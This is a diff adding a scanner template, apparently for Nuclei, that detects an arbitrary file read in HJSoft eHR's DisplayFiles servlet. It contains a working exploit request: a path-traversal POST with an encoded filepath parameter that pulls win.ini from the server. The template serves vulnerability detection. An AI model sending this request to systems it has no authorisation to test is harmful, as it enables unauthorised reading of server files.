@@ -1,0 +1,37 @@
+id: hjsoft-ehr-displayfiles-file-read
+
+info:
+  name: HJSoft eHR DisplayFiles Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an arbitrary file read vulnerability in HJSoft eHR DisplayFiles via a crafted filepath parameter.
+  tags: file-read
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/templates/attestation/../../servlet/DisplayFiles"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      filepath=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
+      - type: word
+        part: header
+        words:
+          - "filename=win.ini"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
